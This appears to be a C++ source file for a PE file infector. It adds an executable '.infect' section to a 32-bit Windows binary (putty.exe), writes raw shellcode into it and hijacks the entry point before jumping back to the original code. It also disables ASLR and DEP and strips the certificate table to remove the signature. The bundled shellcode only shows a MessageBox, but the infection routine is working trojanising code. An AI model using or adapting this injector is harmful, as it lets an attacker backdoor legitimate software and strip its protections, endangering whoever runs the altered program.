#include <iostream>
#include <windows.h>
#include <fstream>
#include <future>
#include <string>
#include <filesystem>
#include "PE.h"

using namespace std;

constexpr std::size_t
align_up(std::size_t value, std::size_t alignment) noexcept
{
	return (value + alignment - 1) & ~(alignment - 1);
}

void Inject_New_Section(char* pe_file, size_t size_of_pe, char xcode[], size_t size_of_xcode, const std::string& out_path)
{
	auto Parsed_PE = PE::ParsePE(pe_file);
	cout << "PE file parsed" << endl;

	// -------- Add the redirect code to the original header in the injection code ---------

	auto imagebase = Parsed_PE.inh32.OptionalHeader.ImageBase;
	auto OEP = Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;
	auto image_base_OEP = imagebase + OEP;
	cout << "Image base: " << std::hex << imagebase << endl;
	cout << "Address of entry point: " << std::hex << OEP << endl;
	cout << "Absolute AOEP: " << std::hex << image_base_OEP << endl;

	// Address of entry poit absolute in little endian
	char push[] = "\x68"; // push
	char esp[] = "\xff\x24\x24"; // jmp [esp]
	char hex_oep[] = { image_base_OEP >> 0 & 0xFF, image_base_OEP >> 8 & 0xFF, image_base_OEP >> 16 & 0xFF, image_base_OEP >> 24 & 0xFF }; // OEP
	auto inj_size = sizeof push + sizeof esp + sizeof hex_oep + size_of_xcode - 4;

	// ------------- Construction of new section -----------------

	// Increment the number of sections because we will add another one
	Parsed_PE.inh32.FileHeader.NumberOfSections++;
	// index of the new section
	auto new_section = Parsed_PE.inh32.FileHeader.NumberOfSections - 1;
	// Vector of section headers, one header extra for the new section
	vector<IMAGE_SECTION_HEADER> new_ish(Parsed_PE.inh32.FileHeader.NumberOfSections + 1);

	// Copy the current Image Section Headers to the new ISH (vector of headers)
	for (size_t i = 0; i < Parsed_PE.inh32.FileHeader.NumberOfSections - 1; ++i)
	{
		new_ish[i] = Parsed_PE.ish[i];
	}

	// Overwrite the original ISH
	Parsed_PE.ish = new_ish;

	// Construction of the new Section Header

	// Section virtual address: VA of previous section plus previous section size + alignment
	Parsed_PE.ish[new_section].VirtualAddress = Parsed_PE.ish[new_section - 1].VirtualAddress + align_up((Parsed_PE.ish[new_section - 1].Misc.VirtualSize ? Parsed_PE.ish[new_section - 1].Misc.VirtualSize : Parsed_PE.ish[new_section - 1].SizeOfRawData), Parsed_PE.inh32.OptionalHeader.SectionAlignment);
	// Name of the new section (8 bytes size)
	memcpy(Parsed_PE.ish[new_section].Name, ".infect", 8);

	// Point to Raw Data: P2RD of previous section plus last section size of raw data
	Parsed_PE.ish[new_section].PointerToRawData = Parsed_PE.ish[new_section - 1].PointerToRawData + Parsed_PE.ish[new_section - 1].SizeOfRawData;
	// Current Virtual Size
	Parsed_PE.ish[new_section].Misc.VirtualSize = inj_size;

	// Current Size of Raw Data
	Parsed_PE.ish[new_section].SizeOfRawData = align_up(inj_size, Parsed_PE.inh32.OptionalHeader.FileAlignment);

	// Characteristics of the new section
	Parsed_PE.ish[new_section].Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;

	// New Size of the image: last VA plus size of last section aligned (VS or RawD, which it's bigger)
	Parsed_PE.inh32.OptionalHeader.SizeOfImage = Parsed_PE.ish[new_section].VirtualAddress + align_up((Parsed_PE.ish[new_section].Misc.VirtualSize) ? Parsed_PE.ish[new_section].Misc.VirtualSize : Parsed_PE.ish[new_section].SizeOfRawData, Parsed_PE.inh32.OptionalHeader.SectionAlignment);

	// New Address of entry point of the PE to our new section
	auto AEP = Parsed_PE.ish[new_section].VirtualAddress;
	Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint = AEP;

	// Inject the code
	auto size_of_code_section = Parsed_PE.ish[new_section].SizeOfRawData;
	shared_ptr<char> n_section(new char[size_of_code_section] {}, std::default_delete<char[]>());

	auto inj_section = n_section.get();
	memcpy(inj_section, xcode, size_of_xcode - 1);
	memcpy(inj_section + size_of_xcode - 1, push, sizeof push);
	memcpy(inj_section + size_of_xcode + sizeof push - 2, hex_oep, sizeof hex_oep);
	memcpy(inj_section + sizeof hex_oep + sizeof push + size_of_xcode - 2, esp, sizeof esp);

	Parsed_PE.Sections.push_back(n_section);

	// disable ASLR
	Parsed_PE.inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	Parsed_PE.inh32.OptionalHeader.DataDirectory[5].VirtualAddress = { 0 };
	Parsed_PE.inh32.OptionalHeader.DataDirectory[5].Size = { 0 };
	Parsed_PE.inh32.FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;

	// disable DEP
	Parsed_PE.inh32.OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

	// Posar a 0 la taula de certificats per a que no hi hagi signatura digital
	Parsed_PE.inh32.OptionalHeader.DataDirectory[4].VirtualAddress = { 0 };
	Parsed_PE.inh32.OptionalHeader.DataDirectory[4].Size = { 0 };

	auto size_of_changed_pe = size_of_pe + size_of_code_section;

	PE::WriteBinary(Parsed_PE, out_path, size_of_changed_pe);

}

int main(int argc, char *argv[])
{
	
	//char fileToInfect[] = "C:\\Windows\\System32\\mspaint.exe";
	char file_to_infect[] = "putty.exe";
	char new_name[] = "putty_aleix_git.exe";

	//auto outfile = argv[2];
	//auto infile = argv[1];
	auto outfile = new_name;
	auto infile = file_to_infect;

	// Open the binary to inject the code. 32 bits please.
	tuple<bool, char*, fstream::pos_type>  bin = PE::OpenBinary(infile);
	if (!get<0>(bin))
	{
		cout << "Error to open file";
		return EXIT_FAILURE;
	}
	char* PE_file = get<1>(bin);
	size_t size_of_pe = get<2>(bin);

	// Open MessageBox
	// Internet
	//char xcode[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\xc\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x1\xda\x8b\x52\x78\x1\xda\x8b\x72\x20\x1\xde\x31\xc9\x41\xad\x1\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x4\x72\x6f\x63\x41\x75\xeb\x81\x78\x8\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x1\xde\x66\x8b\xc\x4e\x49\x8b\x72\x1c\x1\xde\x8b\x14\x8e\x1\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\xc\x59\x50\x51\x66\xb9\x6c\x6c\x51\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x4\xb9\x6f\x78\x41\x0\x51\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd2\x83\xc4\x10\x68\x61\x62\x63\x64\x83\x6c\x24\x3\x64\x89\xe6\x31\xc9\x51\x56\x56\x51\xff\xd0";
	// Compilat a Linux desde asm, problemes per posar mes text.
	char xcode[] = "\x31\xc9\xf7\xe1\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x68\x6c\x6c\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68\x33\x32\x2e\x64\x68\x55\x73\x65\x72\x54\xff\xd0\x68\x6f\x78\x41\x61\x66\x83\x6c\x24\x03\x61\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd5\x83\xc4\x10\x31\xd2\x31\xc9\x52\x68\x48\x6f\x6c\x61\x89\xe7\x52\x68\x55\x77\x55\x00\x89\xe1\x52\x57\x51\x52\xff\xd0\x83\xc4\x10\x68\x65\x73\x73\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd5\x31\xc9\x51\xff\xd0";

	Inject_New_Section(PE_file, size_of_pe, xcode, sizeof xcode, outfile);

	return 0;
}